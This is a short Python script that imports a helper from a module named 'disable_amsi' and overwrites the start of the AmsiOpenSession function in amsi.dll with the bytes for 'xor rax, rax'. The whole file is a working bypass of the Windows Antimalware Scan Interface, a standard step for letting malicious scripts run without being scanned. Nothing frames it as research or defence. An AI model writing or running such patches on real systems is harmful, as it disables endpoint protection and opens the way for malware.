from disable_amsi.disable_amsi import FunctionModifier

if __name__ == "__main__":
    modifier = FunctionModifier('amsi.dll', 'AmsiOpenSession')
    new_bytes = bytes([0x48, 0x31, 0xC0])
    modifier._mf(new_bytes)
